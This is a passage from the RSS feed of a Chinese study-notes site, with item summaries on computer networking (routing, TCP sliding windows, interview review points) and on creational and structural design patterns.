另一种常用的拓扑结构是两个交换机被一个路由器分离开来：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/4.%E8%B7%AF%E7%94%B1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/4.%E8%B7%AF%E7%94%B1/</guid><description>学习地址：
https://community.emc.com/message/835157#835157 路由器 # 以太网交换机工作在第二层即数据链路层，用于在同一网络内部转发以太网帧。
但是，当源和目的IP地址位于不同网络时，以太网帧必须发送给路由器。路由器负责在不同网络间传输报文，通过路由表来决定最佳转发路径。当主机将报文发送至不同IP地址时，由于主机无法直接与本地网络以外的设备通信，报文被转发至默认网关。默认网关就是数据流从本地网络路由至远端设备的目的地。它通常用来连接本地网与公共网。
报文的转发过程 # 路由器在一个接口接收报文并将它从另一个接口转发出去。路由器主要执行以下三个步骤：
将第二层的帧头和帧尾移除，解析出第三层报文。 检查 IP 报文的目的 IP 地址，在路由表中查找最佳路由。 如果路由器找到一条最佳路径，则将三层报文封装到新的二层帧中，并将帧转发到输出端口。 如下图所示：
过程详解 # 发送报文 # PC 1 发送报文给PC 2 时：
首先必须确定目的 IPv4 地址是否位于同一网络。 PC 1 通过将自己的 IPv4 地址与子网掩码做与操作，来判断 PC 1 所属的网段。 接下来，PC 1 对目的 IPv4 地址与 PC 1 的子网掩码做同样的与操作。 如果目的网络地址与PC 1网段相同，则PC 1不使用默认网关，而是在 ARP 缓存中查找目的 IPv4 地址的设备MAC地址。如果MAC地址不在缓存中，则 PC 1 产生一个 ARP 请求来获取地址并将报文发给目的地址。 如果目的网络地址位于另一网络，则PC 1将报文转发至默认网关。 要确定默认网关的 MAC 地址，PC 1 在它的 ARP 表中查找默认网关的 IPv4 地址以及相应的 MAC 地址。 如果 ARP 表中没有默认网关的对应表项，则 PC 1 发送 ARP 请求。路由器 R1 回复 ARP 响应。之后 PC 1 将报文转发至默认网关的 MAC 地址，即路由器 R1 的 Fa0/0 接口。 路由器转发 # R1 从 PC 1 接收到以太网帧后执行以下步骤：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/8.tcp%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/8.tcp%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/</guid><description>学习网址：
https://www.kancloud.cn/wizardforcel/network-basic/135490 TCP 滑动窗口 # 介绍 # 将 TCP 与 UDP 这样的简单传输协议区分开来的根据是它们传输数据的质量。主要考虑的是以下两个关键功能：
可靠性：保证数据确实到达目的地。如果未到达，能够发现并重传。 数据流控：管理数据的发送速率，以使接收设备不致于过载。 要完成这些任务，整个协议操作是围绕滑动窗口确认机制来进行的。因此，理解了滑动窗口，也就是理解了TCP。
面向流的滑动窗口确认机制 # TCP将独立的字节数据当作流来处理。一次发送一个字节并接收一次确认显然是不可行的。即使重叠传输（即不等待确认就发送下一个数据），速度也还是会非常缓慢。
TCP 消息确认机制如下图所示，首先，每一条消息都有一个识别编号，每一条消息都能够被独立地确认，因此同一时刻可以发送多条信息。设备 B 定期发送给 A 一条发送限制参数，制约设备 A 一次能发送的消息最大数量。设备 B 可以对该参数进行调整，以控制设备 A 的数据流。
为了提高速度，TCP 并没有按照字节单个发送而是将数据流划分为片段。片段内所有字节都是一起发送和接收的，因此也是一起确认的。确认机制没有采用 message ID 字段，而是使用的片段内最后一个字节的 sequence number。因此一次可以处理不同的字节数，这一数量即为片段内的 sequence number。
发送方和接收方必须就它们将要为数据流中的字节指定的 sequence number 达成一致。这一过程称为同步，在TCP连接建立时完成。
我们可以将 TCP buffer 中的数据分为以下的四类，并把他们看作一个时间轴，如下图所示：
已发送已确认：数据流中最早的字节已经发送并得到确认。这些数据是站在发送设备的角度来看的。 已发送但尚未确认：已发送但尚未得到确认的字节。发送方在确认之前，不认为这些数据已经被处理。 未发送而接收方已Ready：设备尚未将数据发出，但接收方根据最近一次关于发送方一次要发送多少字节确认自己有足够空间。发送方会立即尝试发送。 未发送而接收方Not Ready：由于接收方 not ready，还不允许将这部分数据发出。 实际上，收发双方各自维护一套独立的变量，来监控发送和接收的数据流落在哪一类。
发送窗口与可用窗口 # 概念 # 整个过程关键的操作在于接收方允许发送方一次能容纳的未确认的字节数。这称为发送窗口，有时也称为窗口。该窗口决定了发送方允许传送的字节数，也是 2 类和 3 类的字节数之和。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0/</guid><description>通过西电的在线 MOOC 学习网络安全：
https://www.icourse163.org/learn/UESTC-235006?tid=272013#/learn/content?type=detail&amp;id=1004490139&amp;sm=1 计算机网络 # 三种工作方式：
单工：数据只能在一个方向上传输
半双工：数据可以在两个方向上传输，但是一次只允许数据在一个方向传输
全双工：允许数据同时在两个方向上传输
IPv4 三类地址：
见：https://tools.ietf.org/html/rfc3330
A类地址 1.0.0.1-126.255.255.254，第一段第一位二进制位以 0 开头，最后三段表示主机地址；
B类地址 128.1.0.1-191.255.255.254，第一段前两位二进制位为 10 开头，最后两段表示主机地址；
C类地址 192.0.1.1-223.255.255.254，第一段前三位二进制位为 110 开头，最后一段表示主机地址；
D 类地址（群播地址） ,第一段前四位为 1110 开头。
IP 协议中的生存时间：
生存时间（TTL，time-to-live）是Internet协议（IP）包中的一个值，它告知路由器该包是否在网络中时间过长而应该被丢弃。
双绞线的双绞原因：
绞合可以减少对相邻导线的电磁干扰。
关于 10BASE-T：
10 代表数据传输率，BASE 基带传输，T 代表双绞线。F 为光纤
网络冲突：
IEEE802.3 协议采用 CSMA/CD 协议，一定会发生冲突；
802.4 和 802.5 则不会。
路由选择协议：
RIP 协议：AS 内部的路由选择协议，采用距离向量算法，限制最大为 15 的跳度；</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/1.%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/1.%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</guid><description>工厂模式 # 介绍 # 意图：
定义一个创建对象的接口，让其子类自己决定实例化哪一个工厂类，工厂模式使其创建过程延迟到子类进行。 应用实例：
您需要一辆汽车，可以直接从工厂里面提货，而不用去管这辆汽车是怎么做出来的，以及这个汽车里面的具体实现。 Hibernate 换数据库只需换方言和驱动就可以。 日志记录器：记录可能记录到本地硬盘、系统事件、远程服务器等，用户可以选择记录日志到什么地方。 数据库访问，当用户不知道最后系统采用哪一类数据库，以及数据库可能有变化时。 设计一个连接服务器的框架，需要三个协议，&amp;ldquo;POP3&amp;rdquo;、&amp;ldquo;IMAP&amp;rdquo;、&amp;ldquo;HTTP&amp;rdquo;，可以把这三个作为产品类，共同实现一个接口。 优点：
一个调用者想创建一个对象，只要知道其名称就可以了。 扩展性高，如果想增加一个产品，只要扩展一个工厂类就可以。 屏蔽产品的具体实现，调用者只关心产品的接口。 缺点：
每次增加一个产品时，都需要增加一个具体类和对象实现工厂，使得系统中类的个数成倍增加，在一定程度上增加了系统的复杂度，同时也增加了系统具体类的依赖。这并不是什么好事。 PostScript:
我感觉所谓的工厂模式，就是重新封装一层接口。 例子 # 工厂模式也就是
鼠标工厂是个父类，有生产鼠标这个接口。
戴尔鼠标工厂，惠普鼠标工厂继承鼠标工厂，可以分别生产戴尔鼠标，惠普鼠标。
生产哪种鼠标不再由参数决定，而是创建鼠标工厂时，由戴尔鼠标工厂创建。后续直接调用**鼠标工厂.生产鼠标()**即可</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/2.%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/2.%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</guid><description>抽象工厂模式 # 抽象工厂模式（Abstract Factory Pattern）是围绕一个超级工厂创建其他工厂。该超级工厂又称为其他工厂的工厂。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。
在抽象工厂模式中，接口是负责创建一个相关对象的工厂，不需要显式指定它们的类。每个生成的工厂都能按照工厂模式提供对象。
介绍 # 意图：
提供一个创建一系列相关或相互依赖对象的接口，而无需指定它们具体的类。 应用实例：
QQ 换皮肤，一整套一起换。 生成不同操作系统的程序。 优点：
当一个产品族中的多个对象被设计成一起工作时，它能保证客户端始终只使用同一个产品族中的对象。 缺点：
产品族扩展非常困难 要增加一个系列的某一产品，既要在抽象的 Creator 里加代码，又要在具体的里面加代码。 PostScript：
我感觉抽象工厂模式就是在工厂模式的两层（底层对象与对外接口）之间再加入一层。 这一层称为超级工厂，最后的派生依赖图类似一个漏斗状。 例子 # 抽象工厂模式也就是不仅生产鼠标，同时生产键盘。也就是：
PC 厂商是个父类，有生产鼠标，生产键盘两个接口。
戴尔工厂，惠普工厂继承它，可以分别生产戴尔鼠标+戴尔键盘，和惠普鼠标+惠普键盘。
创建工厂时，由戴尔工厂创建。
后续**工厂.生产鼠标()**则生产戴尔鼠标，**工厂.生产键盘()**则生产戴尔键盘。
关于扩展性：
假设我们增加华硕工厂，则我们需要增加华硕工厂，和戴尔工厂一样，继承 PC 厂商。
之后创建华硕鼠标，继承鼠标类。创建华硕键盘，继承键盘类即可。
假设我们增加耳麦这个产品，则首先我们需要增加耳麦这个父类，再加上戴尔耳麦，惠普耳麦这两个子类。
之后在PC厂商这个父类中，增加生产耳麦的接口。最后在戴尔工厂，惠普工厂这两个类中，分别实现生产戴尔耳麦，惠普耳麦的功能。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/3.%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/3.%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</guid><description>单例模式 # 单例模式（Singleton Pattern）是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。
这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。
它有以下的三个主要的特点：
单例类只能有一个实例。
单例类必须自己创建自己的唯一实例。
单例类必须给所有其他对象提供这一实例。
介绍 # 意图：
保证一个类仅有一个实例，并提供一个访问它的全局访问点。
一个全局使用的类频繁地创建与销毁、当您想控制实例数目节省系统资源的时候，使用这个创建模式。
应用实例：
一个班级只有一个班主任。
Windows 是多进程多线程的，在操作一个文件的时候，就不可避免地出现多个进程或线程同时操作一个文件的现象，所以所有文件的处理必须通过唯一的实例来进行。
一些设备管理器常常设计为单例模式，比如一个电脑有两台打印机，在输出的时候就要处理不能两台打印机打印同一个文件。
优点：
在内存里只有一个实例，减少了内存的开销，尤其是频繁的创建和销毁实例（比如管理学院首页页面缓存）。
避免对资源的多重占用（比如写文件操作）。
缺点：
没有接口，不能继承，与单一职责原则冲突，一个类应该只关心内部逻辑，而不关心外面怎么样来实例化。 使用场景：
要求生产唯一序列号。
WEB 中的计数器，不用每次刷新都在数据库里加一次，用单例先缓存起来。
创建的一个对象需要消耗的资源过多，比如 I/O 与数据库的连接等。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/4.%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/4.%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/</guid><description>建造者模式 # 建造者模式（Builder Pattern）使用多个简单的对象一步一步构建成一个复杂的对象。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。
一个 Builder 类会一步一步构造最终的对象。该 Builder 类是独立于其他对象的。
介绍 # 意图：
将一个复杂的构建与其表示相分离，使得同样的构建过程可以创建不同的表示。
主要解决在软件系统中，有时候面临着&amp;quot;一个复杂对象&amp;quot;的创建工作，其通常由各个部分的子对象用一定的算法构成；由于需求的变化，这个复杂对象的各个部分经常面临着剧烈的变化，但是将它们组合在一起的算法却相对稳定。
应用实例：
去肯德基，汉堡、可乐、薯条、炸鸡翅等是不变的，而其组合是经常变化的，生成出所谓的&amp;quot;套餐&amp;quot;。 JAVA 中的 StringBuilder。 优点：
建造者独立，易扩展。 便于控制细节风险。 缺点：
产品必须有共同点，范围有限制。 如内部变化复杂，会有很多的建造类。 例子 #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/5.%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/5.%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/</guid><description>原型模式 # 原型模式（Prototype Pattern）是实现了一个原型接口，该接口用于创建当前对象的克隆。
当直接创建对象的代价比较大时，则采用这种模式。例如，一个对象需要在一个高代价的数据库操作之后被创建。我们可以缓存该对象，在下一个请求时返回它的克隆，在需要的时候更新数据库，以此来减少数据库调用。
介绍 # 意图：
用原型实例指定创建对象的种类，并且通过拷贝这些原型创建新的对象。 它有以下的几个使用场景： 当一个系统应该独立于它的产品创建，构成和表示时。 当要实例化的类是在运行时刻指定时，例如，通过动态装载。 为了避免创建一个与产品类层次平行的工厂类层次时。 当一个类的实例只能有几个不同状态组合中的一种时。建立相应数目的原型并克隆它们可能比每次用合适的状态手工实例化该类更方便一些。 优点：
性能提高。 逃避构造函数的约束。 缺点：
配备克隆方法需要对类的功能进行通盘考虑，这对于全新的类不是很难，但对于已有的类不一定很容易，特别当一个类引用不支持串行化的间接对象，或者引用含有循环结构的时候。 必须实现 Cloneable 接口。 例子 # 概括地说，主要有以下的使用场景：
资源优化场景。 类初始化需要消化非常多的资源，这个资源包括数据、硬件资源等。 性能和安全要求的场景。 通过 new 产生一个对象需要非常繁琐的数据准备或访问权限，则可以使用原型模式。 一个对象多个修改者的场景。 一个对象需要提供给其他对象访问，而且各个调用者可能都需要修改其值时，可以考虑使用原型模式拷贝多个对象供调用者使用。 在实际项目中，原型模式很少单独出现，一般是和工厂方法模式一起出现，通过 clone 的方法创建一个对象，然后由工厂方法提供给调用者。原型模式已经与 Java 融为浑然一体，大家可以随手拿来使用。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/10.%E8%A3%85%E9%A5%B0%E5%99%A8%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/10.%E8%A3%85%E9%A5%B0%E5%99%A8%E6%A8%A1%E5%BC%8F/</guid><description>装饰器模式 # 装饰器模式（Decorator Pattern）允许向一个现有的对象添加新的功能，同时又不改变其结构。
这种模式创建了一个装饰类，用来包装原有的类，并在保持类方法签名完整性的前提下，提供了额外的功能。
介绍 # 意图：
动态地给一个对象添加一些额外的职责。就增加功能来说，装饰器模式相比生成子类更为灵活。
当我们不想增加很多子类的情况下扩展类，使用装饰器。它将具体功能职责划分，同时继承装饰者模式。
优点：
装饰类和被装饰类可以独立发展，不会相互耦合，装饰模式是继承的一个替代模式，装饰模式可以动态扩展一个实现类的功能。 缺点：
多层装饰比较复杂。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/11.%E5%A4%96%E8%A7%82%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/11.%E5%A4%96%E8%A7%82%E6%A8%A1%E5%BC%8F/</guid><description>外观模式 # 外观模式（Facade Pattern）隐藏系统的复杂性，并向客户端提供了一个客户端可以访问系统的接口。
介绍 # 意图：
为子系统中的一组接口提供一个一致的界面，外观模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。 当你不需要客户端知道系统内部的复杂联系时，你需要设计一个外观模式的系统。 优点：
减少系统相互依赖。 提高灵活性。 提高了安全性。 缺点：
不符合开闭原则，如果要改东西很麻烦，继承重写都不合适。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/12.%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/12.%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F/</guid><description>享元模式 # 享元模式（Flyweight Pattern）主要用于减少创建对象的数量，以减少内存占用和提高性能。这种类型的设计模式属于结构型模式，它提供了减少对象数量从而改善应用所需的对象结构的方式。
享元模式尝试重用现有的同类对象，如果未找到匹配的对象，则创建新对象。
介绍 # 意图：
运用共享技术有效地支持大量细粒度的对象。 在有大量对象时，有可能会造成内存溢出，我们把其中共同的部分抽象出来，如果有相同的业务请求，直接返回在内存中已有的对象，避免重新创建。 应用实例：
JAVA 中的 String，如果有则返回，如果没有则创建一个字符串保存在字符串缓存池里面。 数据库的数据池。 优点：
大大减少对象的创建，降低系统的内存，使效率提高。 缺点：
提高了系统的复杂度，需要分离出外部状态和内部状态。 而且外部状态具有固有化的性质，不应该随着内部状态的变化而变化，否则会造成系统的混乱。 PostScript：
注意划分外部状态和内部状态，否则可能会引起线程安全问题。 这些类必须有一个工厂对象加以控制。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/13.%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/13.%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/</guid><description>代理模式 # 在代理模式（Proxy Pattern）中，一个类代表另一个类的功能。
介绍 # 意图：
为其他对象提供一种代理以控制对这个对象的访问。
主要解决在直接访问对象时带来的问题，
比如说：要访问的对象在远程的机器上。在面向对象系统中，有些对象由于某些原因（比如对象创建开销很大，或者某些操作需要安全控制，或者需要进程外的访问），直接访问会给使用者或者系统结构带来很多麻烦，我们可以在访问此对象时加上一个对此对象的访问层。
应用实例：
Windows 里面的快捷方式。 买火车票不一定在火车站买，也可以去代售点。 优点：
职责清晰、高扩展性、智能化。 缺点：
由于在客户端和真实主题之间增加了代理对象，因此有些类型的代理模式可能会造成请求的处理速度变慢。 实现代理模式需要额外的工作，有些代理模式的实现非常复杂。 PostScript：
和适配器模式的区别：适配器模式主要改变所考虑对象的接口，而代理模式不能改变所代理类的接口。 和装饰器模式的区别：装饰器模式为了增强功能，而代理模式是为了加以控制。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/6.%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/6.%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/</guid><description>适配器模式 # 适配器模式（Adapter Pattern）是作为两个不兼容的接口之间的桥梁。这种类型的设计模式属于结构型模式，它结合了两个独立接口的功能。
举个真实的例子，读卡器是作为内存卡和笔记本之间的适配器。您将内存卡插入读卡器，再将读卡器插入笔记本，这样就可以通过笔记本来读取内存卡。
介绍 # 意图：
将一个类的接口转换成客户希望的另外一个接口。适配器模式使得原本由于接口不兼容而不能一起工作的那些类可以一起工作。
概括的说，它主要有以下的应用场景：
系统需要使用现有的类，而此类的接口不符合系统的需要 想要建立一个可以重复使用的类，用于与一些彼此之间没有太大关联的一些类，包括一些可能在将来引进的类一起工作，这些源类不一定有一致的接口。 通过接口转换，将一个类插入另一个类系中。（比如老虎和飞禽，现在多了一个飞虎，在不增加实体的需求下，增加一个适配器，在里面包容一个虎对象，实现飞的接口。） 优点：
可以让任何两个没有关联的类一起运行。 提高了类的复用。 增加了类的透明度。 灵活性好。 缺点：
过多地使用适配器，会让系统非常零乱，不易整体进行把握。一个系统如果太多出现这种情况，无异于一场灾难。因此如果不是很有必要，可以不使用适配器，而是直接对系统进行重构。 由于 JAVA 至多继承一个类，所以至多只能适配一个适配者类，而且目标类必须是抽象类。 PostScript：
有动机地修改一个正常运行的系统的接口，这时应该考虑使用适配器模式。
适配器不是在详细设计时添加的，而是解决正在服役的项目的问题。
例子 # 比如下面的例子：
原本：我们有一个 MediaPlayer 的接口，一个实现了这个接口的类 AudioPlayer。它只能播放 mp3。格式的音频文件； 原本：我们还有一个 AdvancedMediaPlayer 的接口，实现了这个接口的类 VlcPlayer、Mp4Player。该类可以播放 vlc 和 mp4 格式的音频文件。 现在我们需要：AudioPlayer 这个类可以播放其他格式的音频文件。 为了实现这个功能：我们创建了一个实现了 AdvancedMediaPlayer 的一个适配器类 MediaAdapter，并使用这个接口定义的方法播所需要的格式。 这些类的结构图大致如下：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/7.%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/7.%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/</guid><description>桥接模式 # 桥接模式（Bridge Pattern）是用于把抽象化与实现化解耦，使得二者可以独立变化。
介绍 # 意图：
将抽象部分与实现部分分离，使它们都可以独立的变化。
在有多种可能会变化的情况下，用继承会造成类爆炸问题，扩展起来不灵活。
优点：
抽象和实现的分离。 优秀的扩展能力。 实现细节对客户透明。 缺点：
桥接模式的引入会增加系统的理解与设计难度，由于聚合关联关系建立在抽象层，要求开发者针对抽象进行设计与编程。 例子 # 我们以前端中常见的功能绘图为例：
